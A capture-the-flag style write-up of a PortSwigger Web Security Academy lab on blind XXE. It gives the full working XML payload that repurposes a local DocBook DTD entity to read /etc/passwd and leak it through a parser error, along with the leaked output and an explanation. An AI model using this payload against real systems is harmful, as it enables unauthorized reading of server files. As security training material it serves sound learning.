# XXE Lab 9 — Exploiting XXE to retrieve data by repurposing a local DTD — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** XXE (Blind, local DTD repurposing)
**Lab:** Exploiting XXE to retrieve data by repurposing a local DTD
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~03:14 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Blind XXE via local DTD repurposing — no external DTD is needed: an entity from a DTD already on the server (`/usr/share/yelp/dtd/docbookx.dtd`, entity `ISOamso`) is redefined to read `/etc/passwd` and leak it through an error message.

## Solution

1. Sent this stock-check XML (`Content-Type: application/xml`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
   <!ENTITY % ISOamso '
   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
   &#x25;eval;
   &#x25;error;
'>
%local_dtd;
   ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
2. The parser loaded the local DTD, hit the redefined `ISOamso` entity, read `/etc/passwd` into `%file;`, then tried to open `file:///nonexistent/<passwd-contents>` — and the error leaked the file: `XML parser exited with error: java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash...`
3. Home page then showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the server already has a DTD on disk, and the parser lets the document redefine one of its entities (`ISOamso`) before the DTD is loaded. The redefinition turns a harmless entity into a file-read + error-leak chain — all without fetching anything from outside, so no external DTD or Collaborator is needed.
- **The `&#x25;` / `&#x26;#x25;` encodings are load-bearing:** they delay expansion so the inner entities are defined at the right moment instead of being expanded (and breaking) while the outer entity is still being read.

## Lessons Learned

- "No external DTD" does not mean safe: if the parser allows redefining entities from a DTD that already exists on the server, the attack works entirely offline.
- This is the stealthiest XXE variant — nothing leaves the server except the error message, so network-based detection sees nothing.

## Next Steps

- Lab 7 (malicious external DTD) — hostname recovered from the exploit server's access log; Arbaz submits it via the Submit-solution prompt.
- Labs 3 and 4 (blind OOB) need Burp Collaborator on his own computer.
- Next topic in the roadmap after XXE: SSTI.
